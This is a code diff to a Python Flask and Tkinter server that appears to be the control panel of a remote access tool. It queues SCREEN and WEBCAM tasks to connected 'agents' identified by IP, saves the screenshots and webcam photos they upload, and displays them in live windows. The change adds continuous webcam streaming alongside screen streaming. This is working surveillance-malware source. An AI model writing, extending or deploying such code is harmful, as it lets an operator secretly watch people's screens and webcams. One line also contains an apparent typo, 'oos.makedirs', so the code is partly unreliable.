@@ -56,16 +56,17 @@ class Connections:
 app = Flask(__name__)
 
 
-def open_image_window(agent_id, label, img_bytes):
-    if agent_id not in streaming_agents:
+def open_image_window(agent_id, label, img_bytes, task):
+    stream_key = f"{agent_id}_{task}"
+    if stream_key not in streaming_agents:
         return
 
     img = Image.open(io.BytesIO(img_bytes))
     img.thumbnail((640, 400))
     photo = ImageTk.PhotoImage(img)
 
-    if agent_id in agent_windows:
-        data = agent_windows[agent_id]
+    if stream_key in agent_windows:
+        data = agent_windows[stream_key]
         data["img_label"].config(image=photo)
         data["img_label"].image = photo
         data["win"].lift()
@@ -73,7 +74,7 @@ def open_image_window(agent_id, label, img_bytes):
         return
 
     win = tk.Toplevel(root)
-    win.title(label)
+    win.title(f"{label} — {task}")
     win.configure(bg="#0D0D0D")
     win.resizable(False, False)
 
@@ -82,17 +83,17 @@ def open_image_window(agent_id, label, img_bytes):
     img_label.pack(padx=10, pady=(10, 5))
 
     def request_next():
-        if agent_id not in agent_windows:
+        if stream_key not in agent_windows:
             return
         user = get_user(agent_id)
         if user:
-            user.add_task("SCREEN")
+            user.add_task(task)
 
-    agent_windows[agent_id] = {"win": win, "img_label": img_label, "request_next": request_next}
+    agent_windows[stream_key] = {"win": win, "img_label": img_label, "request_next": request_next}
 
     def on_close():
-        streaming_agents.discard(agent_id)
-        agent_windows.pop(agent_id, None)
+        streaming_agents.discard(stream_key)
+        agent_windows.pop(stream_key, None)
         win.destroy()
 
     win.protocol("WM_DELETE_WINDOW", on_close)
@@ -213,8 +214,8 @@ def render():
 
         task = allowed_tasks[task_name]
 
-        if task == "SCREEN":
-            streaming_agents.add(agent_id)
+        if task in ("SCREEN", "WEBCAM"):
+            streaming_agents.add(f"{agent_id}_{task}")
 
         get_user(agent_id).add_task(task)
         log(f"[*] {task} for {get_user(agent_id).ip} queued")
@@ -314,8 +315,8 @@ def render():
 
     def check_image_queue():
         while not image_queue.empty():
-            agent_id, label, img_bytes = image_queue.get()
-            open_image_window(agent_id, label, img_bytes)
+            agent_id, label, img_bytes, task = image_queue.get()
+            open_image_window(agent_id, label, img_bytes, task)
         root.after(500, check_image_queue)
 
     update_connections_list()
@@ -396,7 +397,7 @@ def screen():
     with open(f"screens/{request.remote_addr}_{time.time()}.png", "wb") as f:
         f.write(img_bytes)
 
-    image_queue.put((id, label, img_bytes))
+    image_queue.put((id, label, img_bytes, "SCREEN"))
     log(f"    > Frame received from {request.remote_addr}")
     return "OK"
 
@@ -415,10 +416,15 @@ def receive_webcam():
     file = request.files.get("file")
     if not file or not agent_id:
         return jsonify({"error": "missing data"}), 400
+    img_bytes = file.read()
+    user = get_user(agent_id)
+    label = user.name if user else request.remote_addr
     oos.makedirs("webcams", exist_ok=True)
-    file.save(f"webcams/{agent_id}:{time.time()}.png")
-    log(f"    -> Webcam photo received from {request.remote_addr}")
-    return "OK"          
+    with open(f"webcams/{agent_id}_{time.time()}.png", "wb") as f:
+        f.write(img_bytes)
+    image_queue.put((agent_id, label, img_bytes, "WEBCAM"))
+    log(f"    -> Webcam frame received from {request.remote_addr}")
+    return "OK"
     
 
 def run_server():
